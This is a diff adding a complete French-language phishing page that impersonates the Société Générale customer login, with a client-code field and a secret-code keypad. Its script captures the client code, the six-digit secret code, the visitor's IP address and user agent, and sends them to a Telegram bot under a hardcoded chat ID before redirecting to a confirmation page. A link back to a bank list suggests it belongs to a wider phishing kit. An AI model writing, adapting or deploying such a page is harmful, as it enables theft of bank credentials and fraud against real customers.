@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+            <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Société Générale</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --sg-red: #e70033;
+            --sg-dark-blue: #0f1738;
+            --sg-gray: #f4f5f7;
+            --light-gray: #f9f9f9;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body { 
+            font-family: 'Open Sans', sans-serif; 
+            margin: 0; 
+            background-color: #fff; 
+            min-height: 100vh;
+        }
+
+        /* HEADER */
+        header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 15px 20px; 
+            border-bottom: 1px solid #eee; 
+        }
+        
+        .logo { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            font-weight: bold; 
+        }
+        
+        .logo-box { 
+            width: 30px; 
+            height: 22px; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        
+        .logo-top { 
+            background: var(--sg-red); 
+            height: 50%; 
+        }
+        
+        .logo-bottom { 
+            background: #000; 
+            height: 50%; 
+        }
+        
+        .header-btn {
+            border: 2px solid var(--sg-dark-blue); 
+            background: none; 
+            padding: 6px 15px; 
+            border-radius: 20px; 
+            font-weight: bold; 
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        /* BACK BUTTON */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 40px;
+            padding: 10px 18px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e293b;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            margin-bottom: 15px;
+        }
+
+        .back-button:hover {
+            background-color: #f8fafc;
+            border-color: #cbd5e1;
+            transform: translateX(-2px);
+        }
+
+        .back-button svg {
+            width: 18px;
+            height: 18px;
+            stroke-width: 2.5;
+        }
+        
+        /* MAIN LAYOUT */
+        main { 
+            max-width: 1100px; 
+            margin: 0 auto; 
+            padding: 20px 15px;
+        }
+        
+        .main-title {
+            color: #666; 
+            font-size: 16px; 
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .login-container { 
+            display: flex; 
+            flex-direction: column;
+            gap: 30px; 
+            min-height: auto;
+        }
+        
+        @media (min-width: 768px) {
+            .login-container {
+                flex-direction: row;
+                justify-content: center;
+                min-height: 450px;
+            }
+            
+            .main-title {
+                text-align: left;
+                margin-bottom: 40px;
+            }
+        }
+        
+        .login-left { 
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+        
+        @media (min-width: 768px) {
+            .login-left {
+                width: 380px;
+            }
+        }
+        
+        .divider { 
+            display: none;
+        }
+        
+        @media (min-width: 768px) {
+            .divider {
+                display: block;
+                width: 1px; 
+                background: #ddd; 
+            }
+        }
+        
+        .login-right { 
+            width: 100%;
+            max-width: 400px;
+            font-size: 14px; 
+            margin: 0 auto;
+            padding: 20px 0;
+            border-top: 1px solid #eee;
+        }
+        
+        @media (min-width: 768px) {
+            .login-right {
+                width: 400px;
+                padding: 0;
+                border-top: none;
+            }
+        }
+
+        /* FORM ELEMENTS */
+        .step-hidden { 
+            display: none !important; 
+        }
+        
+        .input-wrapper { 
+            position: relative; 
+            border-bottom: 1px solid #999; 
+            margin-bottom: 20px; 
+        }
+        
+        .input-wrapper input { 
+            width: 100%; 
+            border: none; 
+            padding: 12px 0; 
+            font-size: 16px; 
+            outline: none; 
+        }
+        
+        @media (min-width: 768px) {
+            .input-wrapper input {
+                font-size: 18px;
+            }
+        }
+        
+        .btn-red { 
+            background: var(--sg-red); 
+            color: white; 
+            border: none; 
+            width: 100%; 
+            padding: 16px; 
+            border-radius: 30px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: 20px; 
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        
+        .btn-red:hover {
+            background: #c5002b;
+        }
+        
+        .btn-red:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+        }
+
+        /* KEYPAD STYLING */
+        .keypad-grid { 
+            display: grid; 
+            grid-template-columns: repeat(4, 1fr); 
+            gap: 10px; 
+            margin: 20px 0; 
+        }
+        
+        @media (min-width: 768px) {
+            .keypad-grid {
+                gap: 12px;
+            }
+        }
+        
+        .key { 
+            background: var(--light-gray); 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            height: 55px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 20px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+            color: var(--sg-dark-blue);
+            touch-action: manipulation;
+        }
+        
+        @media (min-width: 768px) {
+            .key {
+                height: 60px;
+                font-size: 22px;
+            }
+        }
+        
+        .key:hover { 
+            background: #e8e8e8; 
+            border-color: var(--sg-red);
+        }
+        
+        .key:active {
+            transform: scale(0.95);
+            background: #e0e0e0;
+        }
+        
+        .key.empty { 
+            background: transparent; 
+            border: none;
+            cursor: default; 
+        }
+        
+        .key.empty:hover {
+            background: transparent;
+            border: none;
+        }
+
+        .secret-dots { 
+            display: flex; 
+            justify-content: center; 
+            gap: 15px; 
+            margin-bottom: 25px; 
+            align-items: center;
+        }
+        
+        @media (min-width: 768px) {
+            .secret-dots {
+                gap: 20px;
+                margin-bottom: 30px;
+            }
+        }
+        
+        .dot { 
+            width: 14px; 
+            height: 14px; 
+            border-radius: 50%; 
+            background: #ddd; 
+            border: 2px solid #ddd;
+            transition: all 0.3s;
+        }
+        
+        @media (min-width: 768px) {
+            .dot {
+                width: 16px;
+                height: 16px;
+            }
+        }
+        
+        .dot.filled { 
+            background: var(--sg-dark-blue); 
+            border-color: var(--sg-dark-blue);
+            transform: scale(1.1);
+        }
+
+        .keypad-footer { 
+            text-align: center; 
+            font-size: 14px; 
+            text-decoration: underline; 
+            color: var(--sg-dark-blue); 
+            cursor: pointer; 
+            margin-top: 20px;
+        }
+
+        /* ASIDE MENU - CACHÉ SUR MOBILE */
+        .side-menu { 
+            display: none;
+        }
+        
+        @media (min-width: 1024px) {
+            .side-menu { 
+                position: fixed; 
+                right: 0; 
+                top: 40%; 
+                background: var(--sg-dark-blue); 
+                color: white; 
+                display: flex; 
+                flex-direction: column; 
+                border-radius: 4px 0 0 4px; 
+            }
+            
+            .side-item { 
+                padding: 15px; 
+                border-bottom: 1px solid rgba(255,255,255,0.1); 
+                cursor: pointer; 
+                transition: background 0.3s;
+            }
+            
+            .side-item:hover {
+                background: rgba(255,255,255,0.1);
+            }
+        }
+
+        /* LOADER */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--sg-red);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-container {
+            text-align: center;
+            margin-top: 20px;
+            display: none;
+        }
+
+        /* SUCCESS MESSAGE */
+        .success-message {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* STYLES POUR LES TOGGLES ET CHAMPS */
+        .toggle-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #666;
+            margin: 20px 0;
+        }
+        
+        .toggle-switch {
+            width: 34px;
+            height: 18px;
+            background: #ddd;
+            border-radius: 10px;
+            position: relative;
+            cursor: pointer;
+        }
+        
+        .toggle-knob {
+            width: 14px;
+            height: 14px;
+            background: white;
+            border-radius: 50%;
+            position: absolute;
+            left: 2px;
+            top: 2px;
+            transition: left 0.3s;
+        }
+        
+        .clear-icon {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            cursor: pointer;
+            padding: 5px;
+        }
+        
+        /* INFO SECTION */
+        .info-title {
+            font-size: 15px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .info-text {
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        
+        .info-link {
+            color: #333;
+            display: block;
+            margin-bottom: 8px;
+            text-decoration: none;
+        }
+        
+        .info-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* MOBILE OPTIMIZATIONS */
+        @media (max-width: 767px) {
+            header {
+                padding: 12px 15px;
+            }
+            
+            .logo span {
+                font-size: 20px;
+            }
+            
+            .header-btn {
+                padding: 5px 12px;
+                font-size: 11px;
+            }
+            
+            main {
+                padding: 15px;
+            }
+            
+            .main-title {
+                font-size: 14px;
+                margin-bottom: 25px;
+            }
+            
+            .key {
+                height: 50px;
+                font-size: 18px;
+            }
+            
+            .secret-dots {
+                gap: 12px;
+                margin-bottom: 20px;
+            }
+            
+            .dot {
+                width: 12px;
+                height: 12px;
+            }
+            
+            .btn-red {
+                padding: 14px;
+                font-size: 15px;
+            }
+            
+            .login-right {
+                font-size: 13px;
+            }
+            
+            .info-title {
+                font-size: 14px;
+            }
+            
+            .info-text {
+                font-size: 13px;
+            }
+        }
+        
+        /* TRÈS PETITS ÉCRANS */
+        @media (max-width: 374px) {
+            .key {
+                height: 45px;
+                font-size: 16px;
+            }
+            
+            .secret-dots {
+                gap: 10px;
+            }
+            
+            .dot {
+                width: 10px;
+                height: 10px;
+            }
+        }
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+<button class="back-button" onclick="window.location.href='bank.html'">
+    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
+    </svg>
+    Retour aux banques
+</button>
+
+<header>
+    <div class="logo">
+        <span>SG</span>
+        <div class="logo-box">
+            <div class="logo-top"></div>
+            <div class="logo-bottom"></div>
+        </div>
+        <div style="font-size: 9px; line-height: 1;">C'EST VOUS<br>L'AVENIR</div>
+    </div>
+    <button class="header-btn">Ouvrir un compte</button>
+</header>
+
+<main>
+    <h2 class="main-title">Connexion à votre Espace Client Particuliers</h2>
+
+    <div class="login-container">
+        <div id="step1" class="login-left">
+            <div class="input-wrapper">
+                <input type="text" id="clientCode" placeholder="Saisissez votre code client" maxlength="10">
+                <i class="fa-solid fa-xmark clear-icon" onclick="clearClientCode()"></i>
+            </div>
+            
+            <div class="toggle-container">
+                <div class="toggle-switch" onclick="toggleRemember()">
+                    <div id="toggleSwitch" class="toggle-knob"></div>
+                </div>
+                <span id="rememberText">non Se souvenir de moi</span>
+                <i class="fa-regular fa-circle-question"></i>
+            </div>
+
+            <button class="btn-red" onclick="goToStep2()">Valider</button>
+        </div>
+
+        <div id="step2" class="login-left step-hidden">
+            <div class="toggle-container" style="margin-bottom: 15px;">
+                <div class="toggle-switch" onclick="toggleRemember()">
+                    <div id="toggleSwitch2" class="toggle-knob"></div>
+                </div>
+                <span id="rememberText2">non Se souvenir de moi</span>
+                <i class="fa-regular fa-circle-question"></i>
+            </div>
+
+            <div class="secret-dots">
+                <div class="dot" id="dot-0"></div>
+                <div class="dot" id="dot-1"></div>
+                <div class="dot" id="dot-2"></div>
+                <div class="dot" id="dot-3"></div>
+                <div class="dot" id="dot-4"></div>
+                <div class="dot" id="dot-5"></div>
+                <i class="fa-solid fa-xmark" style="margin-left: 10px; color: #666; cursor: pointer;" onclick="resetDots()"></i>
+            </div>
+
+            <!-- CLAVIER -->
+            <div class="keypad-grid">
+                <div class="key" onclick="addDot(1)">1</div>
+                <div class="key" onclick="addDot(2)">2</div>
+                <div class="key" onclick="addDot(3)">3</div>
+                <div class="key empty"></div>
+                
+                <div class="key" onclick="addDot(4)">4</div>
+                <div class="key" onclick="addDot(5)">5</div>
+                <div class="key" onclick="addDot(6)">6</div>
+                <div class="key" onclick="addDot(0)">0</div>
+                
+                <div class="key" onclick="addDot(7)">7</div>
+                <div class="key" onclick="addDot(8)">8</div>
+                <div class="key" onclick="addDot(9)">9</div>
+                <div class="key empty"></div>
+                
+                <div class="key empty"></div>
+                <div class="key empty"></div>
+                <div class="key empty"></div>
+                <div class="key empty"></div>
+            </div>
+
+            <button class="btn-red" id="validateBtn" onclick="validateAndSend()">Valider</button>
+            
+            <div id="loading" class="loading-container">
+                <div class="loader"></div>
+                <span style="color: var(--sg-red); font-weight: 600;">Connexion en cours...</span>
+            </div>
+            
+            <div id="success-message" class="success-message"></div>
+            
+            <p class="keypad-footer">Activer le clavier sonore</p>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="login-right">
+            <h3 class="info-title">Où trouver mon Code Client SG ?</h3>
+            <p class="info-text">Votre Code Client vous a été communiqué lors de la souscription... Il est également indiqué sur vos relevés de comptes.</p>
+            
+            <h3 class="info-title">Code Client ou Code Secret inconnus ?</h3>
+            <a href="#" class="info-link">» Je souhaite obtenir mon Code Client</a>
+            <a href="#" class="info-link">» Je ne connais pas mon Code Secret</a>
+        </div>
+    </div>
+</main>
+
+<aside class="side-menu">
+    <div class="side-item"><i class="fa-regular fa-comment-dots"></i></div>
+    <div class="side-item"><i class="fa-regular fa-calendar-days"></i></div>
+</aside>
+
+<script>
+const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
+const CHAT_ID = '8176081750';
+
+let clientCode = '';
+let secretCode = '';
+
+function goToStep2() {
+    const code = document.getElementById('clientCode').value.trim();
+    if (!code) return;
+    clientCode = code;
+    
+    const rememberMe = document.getElementById('toggleSwitch');
+    if (rememberMe.style.left === '16px') {
+        localStorage.setItem('sg_client_code', code);
+    }
+    
+    document.getElementById('step1').classList.add('step-hidden');
+    document.getElementById('step2').classList.remove('step-hidden');
+    secretCode = '';
+}
+
+function clearClientCode() {
+    document.getElementById('clientCode').value = '';
+}
+
+function toggleRemember() {
+    const toggle = event.target.closest('.toggle-switch').querySelector('.toggle-knob');
+    if (toggle.style.left === '16px') {
+        toggle.style.left = '2px';
+    } else {
+        toggle.style.left = '16px';
+    }
+}
+
+function addDot(num) {
+    if (secretCode.length < 6) {
+        secretCode += num;
+        updateDots();
+    }
+}
+
+function updateDots() {
+    for (let i = 0; i < 6; i++) {
+        const dot = document.getElementById(`dot-${i}`);
+        if (i < secretCode.length) {
+            dot.classList.add('filled');
+        } else {
+            dot.classList.remove('filled');
+        }
+    }
+}
+
+function resetDots() {
+    secretCode = '';
+    updateDots();
+}
+
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || 'Non disponible';
+    } catch (error) {
+        return 'Non disponible';
+    }
+}
+
+async function validateAndSend() {
+    if (secretCode.length !== 6) return;
+    
+    const ip = await getIP();
+    const message = `🏦 SOCIÉTÉ GÉNÉRALE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Code Client: ${clientCode}\n🔑 Code Secret: ${secretCode}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
+
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: window.CHAT_ID || CHAT_ID,
+                text: message
+            })
+        });
+        
+        const data = await response.json();
+        if (data.ok) {
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('validateBtn').disabled = true;
+            setTimeout(() => {
+                window.location.href = 'confirmation.html';
+            }, 1500);
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+    }
+}
+
+const savedCode = localStorage.getItem('sg_client_code');
+if (savedCode) {
+    document.getElementById('clientCode').value = savedCode;
+}
+</script>
+</body>
+</html>
+
